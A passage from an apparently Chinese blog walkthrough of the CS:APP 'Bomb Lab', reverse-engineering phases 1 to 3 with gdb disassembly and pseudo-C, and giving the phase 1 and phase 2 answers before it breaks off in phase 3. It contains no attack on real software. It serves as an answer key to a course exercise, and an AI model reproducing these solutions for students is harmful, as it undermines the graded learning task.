function\">seg6</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">seg3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">seg3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    rbx <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    rbp <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    eax <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>rbx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>al <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">// seg2</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">seg2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        edx <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token function\">seg7</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token function\">seg4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    edx <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">seg7</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">seg5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    edx <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">seg7</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token function\">seg6</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    edx <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">seg7</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token function\">seg7</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    eax <span class=\"token operator\">=</span> edx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\">// 还原 rbx rbp r12</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">// 传入参数有 rdi rsi，返回值在 eax 中</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">strings_not_equal</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> str<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token comment\">// seg1</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token comment\">// 保存 r12 rbp rbx 的值</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    rbx <span class=\"token operator\">=</span> rdi</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    rbp <span class=\"token operator\">=</span> rsi</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    call string_length</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    r12d <span class=\"token operator\">=</span> eax</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    rdi <span class=\"token operator\">=</span> rbp</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    call string_length</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    edx <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>r12d <span class=\"token operator\">!=</span> eax<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token function\">seg7</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        eax <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>rbx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>al <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token function\">seg4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>al <span class=\"token operator\">==</span> <span class=\"token operator\">*</span>rbp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>                <span class=\"token function\">seg3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                <span class=\"token function\">seg5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们对调用的函数 <code>string_length</code>  反汇编看一下：</p>\n<pre><code>000000000040131b &lt;string_length&gt;:\n  40131b:\t80 3f 00             \tcmpb   $0x0,(%rdi)\n  40131e:\t74 12                \tje     401332 &lt;string_length+0x17&gt;\n  401320:\t48 89 fa             \tmov    %rdi,%rdx\n  401323:\t48 83 c2 01          \tadd    $0x1,%rdx\n  401327:\t89 d0                \tmov    %edx,%eax\n  401329:\t29 f8                \tsub    %edi,%eax\n  40132b:\t80 3a 00             \tcmpb   $0x0,(%rdx)\n  40132e:\t75 f3                \tjne    401323 &lt;string_length+0x8&gt;\n  401330:\tf3 c3                \trepz retq\n  401332:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401337:\tc3                   \tretq\n</code></pre>\n<p>其 C 语言转化如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 传入参数为 rdi，推测其为字符串的首地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">string_length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>rdi <span class=\"token operator\">==</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        rax <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    rdx <span class=\"token operator\">=</span> rdi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">do</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        rdx <span class=\"token operator\">+=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        eax <span class=\"token operator\">=</span> edx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        eax <span class=\"token operator\">-=</span> edi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>rdx <span class=\"token operator\">!=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为 <code>string_length</code>  中传入的应该是字符串首地址，存储在寄存器 <code>%rdi</code>  中。而 <code>strings_not_equal</code>  中我们使用了两个寄存器 <code>%rdi</code>  和 <code>%rsi</code> ，那么 <code>%rsi</code>  中保存的应该是第二个字符串的地址。而在 <code>phase_1</code>  中，我们让 <code>%rsi = 0x402400</code> ，也就是说 <code>0x402400</code>  这里有个字符串，我们要让输入的字符串和这里的字符串相同，才能让 <code>%rax = 0</code> 。</p>\n<p>输入 <code>x/s 0x402400</code> ，得到如下结果：</p>\n<pre><code>(gdb) x/s 0x402400\n0x402400:       &quot;Border relations with Canada have never been better.&quot;\n</code></pre>\n<p>这就是我们应该在 <code>phase_1</code>  中输入的字符串了！让我们来试试！结果如下：</p>\n<pre><code>(gdb)\nPhase 1 defused. How about the next one?\n81          printf(&quot;Phase 1 defused. How about the next one?\\n&quot;);\n</code></pre>\n<p>成功！现在准备解决 <code>phase_2</code>  的问题， <code>gdb</code>  先不管。</p>\n<h2 id=\"phase2-分析-分支跳转-循环\"><a class=\"markdownIt-Anchor\" href=\"#phase2-分析-分支跳转-循环\">#</a> phase2 分析：分支跳转 &amp; 循环</h2>\n<p><code>phase_2</code>  的反汇编如下：</p>\n<pre><code>0000000000400efc &lt;phase_2&gt;:\n  400efc:\t55                   \tpush   %rbp\n  400efd:\t53                   \tpush   %rbx\n  400efe:\t48 83 ec 28          \tsub    $0x28,%rsp\n  400f02:\t48 89 e6             \tmov    %rsp,%rsi\n  400f05:\te8 52 05 00 00       \tcallq  40145c &lt;read_six_numbers&gt;\n  400f0a:\t83 3c 24 01          \tcmpl   $0x1,(%rsp)\n  400f0e:\t74 20                \tje     400f30 &lt;phase_2+0x34&gt;\n  400f10:\te8 25 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f15:\teb 19                \tjmp    400f30 &lt;phase_2+0x34&gt;\n\n  400f17:\t8b 43 fc             \tmov    -0x4(%rbx),%eax\n  400f1a:\t01 c0                \tadd    %eax,%eax\n  400f1c:\t39 03                \tcmp    %eax,(%rbx)\n  400f1e:\t74 05                \tje     400f25 &lt;phase_2+0x29&gt;\n  400f20:\te8 15 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f25:\t48 83 c3 04          \tadd    $0x4,%rbx\n  400f29:\t48 39 eb             \tcmp    %rbp,%rbx\n  400f2c:\t75 e9                \tjne    400f17 &lt;phase_2+0x1b&gt;\n  400f2e:\teb 0c                \tjmp    400f3c &lt;phase_2+0x40&gt;\n\n  400f30:\t48 8d 5c 24 04       \tlea    0x4(%rsp),%rbx\n  400f35:\t48 8d 6c 24 18       \tlea    0x18(%rsp),%rbp\n  400f3a:\teb db                \tjmp    400f17 &lt;phase_2+0x1b&gt;\n\n  400f3c:\t48 83 c4 28          \tadd    $0x28,%rsp\n  400f40:\t5b                   \tpop    %rbx\n  400f41:\t5d                   \tpop    %rbp\n  400f42:\tc3                   \tretq\n</code></pre>\n<p>我们将其转化为 C 语言试试：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// // 400f17</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>     <span class=\"token comment\">// eax = *(rbx - 0x4);</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>     <span class=\"token comment\">// eax *= 2;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>     <span class=\"token comment\">// if(*rbx == eax) &#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>     <span class=\"token comment\">//     rbx += 4;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     <span class=\"token comment\">//     if(rbx != rbp)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>     <span class=\"token comment\">//         //400f17</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>     <span class=\"token comment\">//     else</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>     <span class=\"token comment\">//         //400f3c</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     <span class=\"token comment\">//         // 恢复栈空间和 rbp rbx</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     <span class=\"token comment\">//         return eax;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>     <span class=\"token comment\">// &#125;else &#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     <span class=\"token comment\">//     call explode_bomb</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     <span class=\"token comment\">// &#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">phase_2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 保存 rbp rbx</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">//rsp 留出 40 个字节</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    rsi <span class=\"token operator\">=</span> rsp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    call read_six_numbers</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>rsp <span class=\"token operator\">==</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">// 400f30</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        rbx <span class=\"token operator\">=</span> rsp <span class=\"token operator\">+</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        rbp <span class=\"token operator\">=</span> rsp <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\">// 400f17 改写为循环</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            eax <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rbx <span class=\"token operator\">-</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            eax <span class=\"token operator\">*=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>rbx <span class=\"token operator\">!=</span> eax<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                call explode_bomb</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            rbx <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>rbx <span class=\"token operator\">!=</span> rbp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        call explode_bomb</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们对 <code>read_six_numebrs</code>  反汇编一下看看：</p>\n<pre><code>000000000040145c &lt;read_six_numbers&gt;:\n  40145c:\t48 83 ec 18          \tsub    $0x18,%rsp\n  401460:\t48 89 f2             \tmov    %rsi,%rdx\n  401463:\t48 8d 4e 04          \tlea    0x4(%rsi),%rcx\n  401467:\t48 8d 46 14          \tlea    0x14(%rsi),%rax\n  40146b:\t48 89 44 24 08       \tmov    %rax,0x8(%rsp)\n  401470:\t48 8d 46 10          \tlea    0x10(%rsi),%rax\n  401474:\t48 89 04 24          \tmov    %rax,(%rsp)\n  401478:\t4c 8d 4e 0c          \tlea    0xc(%rsi),%r9\n  40147c:\t4c 8d 46 08          \tlea    0x8(%rsi),%r8\n  401480:\tbe c3 25 40 00       \tmov    $0x4025c3,%esi\n  401485:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  40148a:\te8 61 f7 ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  40148f:\t83 f8 05             \tcmp    $0x5,%eax\n  401492:\t7f 05                \tjg     401499 &lt;read_six_numbers+0x3d&gt;\n  401494:\te8 a1 ff ff ff       \tcallq  40143a &lt;explode_bomb&gt;\n  401499:\t48 83 c4 18          \tadd    $0x18,%rsp\n  40149d:\tc3                   \tretq\n</code></pre>\n<p>这里也有 <code>explode_bomb</code> ，有玄机啊～</p>\n<p>先分析 <code>read_six_numbers</code> ，这里就一个跳转，整个过程容易分析：</p>\n<pre><code>1. 保留 24 个字节的位置\n2. rdx = rsi\n3. rcx = rsi + 0x4\n4. rax = rsi + 20\n5. *(rsp + 8) = rax\n6. rax = rsi + 16\n7. *rsp = rax\n8. r9 = rsi + 12\n9. r8 = rsi + 8\n10. esi = 0x4025c3\n11. eax = 0\n12. call sccanf 获取输入\n13. if(eax &gt; 5) 恢复栈，返回 eax\n14. 否则爆炸\n</code></pre>\n<p>这里传入的应该只有一个参数，就是 <code>%rsi</code>  寄存器中的值，在前面 <code>phase_2</code>  里面 <code>%rsi = %rsp</code> 。那么输入的值应该是从 <code>%rsp</code>  开始存储。我们使用如下命令打印 <code>0x4025c3</code>  处的值，得到如下结果：</p>\n<pre><code>(gdb) x/s 0x4025c3\n0x4025c3:       &quot;%d %d %d %d %d %d&quot;\n</code></pre>\n<p>这里 <code>%eax</code>  中存储的应该是 <code>sscanf</code>  读入的数据个数，如果 <code>%eax &gt; 5</code>  的话， <code>read_six_numbers</code>  顺利过关，否则爆炸。</p>\n<p>那么数组应该是保存在 <code>%rsi</code>  指向的位置（也就是一开始 <code>%rsp</code>  指向的位置），通过分析 <code>phase_2</code>  的代码，我们可以总结出以下要求：</p>\n<ol>\n<li>输入的第 1 个数必须是 1</li>\n<li>下一个数是前一个数的两倍</li>\n<li>输入 6 个数字，而且是整数，不是浮点数</li>\n</ol>\n<p>那么了解了要求后，我们需要输入 <code>1 2 4 8 16 32</code>  这 6 个数，看看结果：</p>\n<pre><code>(gdb)\nThat's number 2.  Keep going!\n88          printf(&quot;That's number 2.  Keep going!\\n&quot;);\n</code></pre>\n<p><code>phase_2</code>  破解成功！我们继续 <code>phase_3</code> ！</p>\n<h2 id=\"phase3-分析switch语句\"><a class=\"markdownIt-Anchor\" href=\"#phase3-分析switch语句\">#</a> phase3 分析： <code>switch</code>  语句</h2>\n<p><code>phase_3</code>  的反汇编代码如下：</p>\n<pre><code>0000000000400f43 &lt;phase_3&gt;:\n  400f43:\t48 83 ec 18          \tsub    $0x18,%rsp\n  400f47:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  400f4c:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  400f51:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  400f56:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400f5b:\te8 90 fc ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  400f60:\t83 f8 01             \tcmp    $0x1,%eax\n  400f63:\t7f 05                \tjg     400f6a &lt;phase_3+0x27&gt;\n  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f6a:\t83 7c 24 08 07       \tcmpl   $0x7,0x8(%rsp)\n  400f6f:\t77 3c                \tja     400fad &lt;phase_3+0x6a&gt;\n  400f71:\t8b 44 24 08          \tmov    0x8(%rsp),%eax\n  400f75:\tff 24 c5 70 24 40 00 \tjmpq   *0x402470(,%rax,8)\n  400f7c:\tb8 cf 00 00 00       \tmov    $0xcf,%eax\n  400f81:\teb 3b                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f83:\tb8 c3 02 00 00       \tmov    $0x2c3,%eax\n  400f88:\teb 34                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f8a:\tb8 00 01 00 00       \tmov    $0x100,%eax\n  400f8f:\teb 2d                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f91:\tb8 85 01 00 00       \tmov    $0x185,%eax\n  400f96:\teb 26                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f98:\tb8 ce 00 00 00       \tmov    $0xce,%eax\n  400f9d:\teb 1f                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f9f:\tb8 aa 02 00 00       \tmov    $0x2aa,%eax\n  400fa4:\teb 18                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fa6:\tb8 47 01 00 00       \tmov    $0x147,%eax\n  400fab:\teb 11                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fb2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400fb7:\teb 05                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400fc9:\t48 83 c4 18          \tadd    $0x18,%rsp\n  400fcd:\tc3                   \tretq\n</code></pre>\n<p><s>这段代码较长，我们将其转化为 C 语言试试</s>：<br>\n我们先不转化成 C 语言，先来看一下让炸弹爆炸的几个条件。炸弹爆炸出现在如下几个地方：</p>\n<pre><code>  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>对第一处，我们先进行分析：</p>\n<pre><code>  400f43:\t48 83 ec 18          \tsub    $0x18,%rsp\n  400f47:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  400f4c:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  400f51:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  400f56:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400f5b:\te8 90 fc ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  400f60:\t83 f8 01             \tcmp    $0x1,%eax\n  400f63:\t7f 05                \tjg     400f6a &lt;phase_3+0x27&gt;\n  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>这段代码首先分配了 24 个字节的栈空间，随后做了如下步骤：</p>\n<ol>\n<li>rcx = rsp + 12</li>\n<li>rdx = rsp + 8</li>\n<li>esi = 0x4025cf</li>\n<li>eax = 0</li>\n<li>call sscanf</li>\n<li>将 eax 与 1 进行比较</li>\n<li>如果 eax &gt; 1，跳转到 <code>400f6a</code></li>\n<li>否则炸弹爆炸</li>\n</ol>\n<p>这段代码和我们上一段看到的 <code>sscanf</code>  之前的代码非常相似， <code>0x4025cf</code>  多半是一个让你输入一串东西的指令地址，我们看一下 <code>%esi(0x4025cf)</code>  附近的值等于多少：</p>\n<pre><code>(gdb) x/s 0x4025cf\n0x4025cf:       &quot;%d %d&quot;\n</code></pre>\n<p>这里说明我们需要输入 2 个数字，如果不是输入 2 个数字的话，炸弹就会爆炸。第一个要求明确了。</p>\n<p>再来看第二处炸弹的位置前后的代码，它的上一条代码是个 <code>jmp</code> 